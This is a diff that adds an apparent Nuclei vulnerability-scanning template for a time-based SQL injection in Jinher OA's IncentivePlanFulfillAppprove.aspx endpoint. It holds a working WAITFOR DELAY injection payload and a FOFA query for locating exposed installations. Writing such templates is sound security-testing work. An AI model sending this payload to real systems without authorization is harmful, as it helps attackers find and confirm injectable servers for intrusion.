@@ -1,0 +1,48 @@
+id: jinher-incentiveplanfulfillappprove-sqli
+info:
+  name: 金和OA IncentivePlanFulfillAppprove SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,fofa
+  metadata:
+    product: "金和OA"
+    fofa-query: "app=\"金和网络-金和OA\""
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "C6/Jhsoft.Web.login"
+        part: body
+
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "页面数据错误"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2) && duration < to_number(t3)"
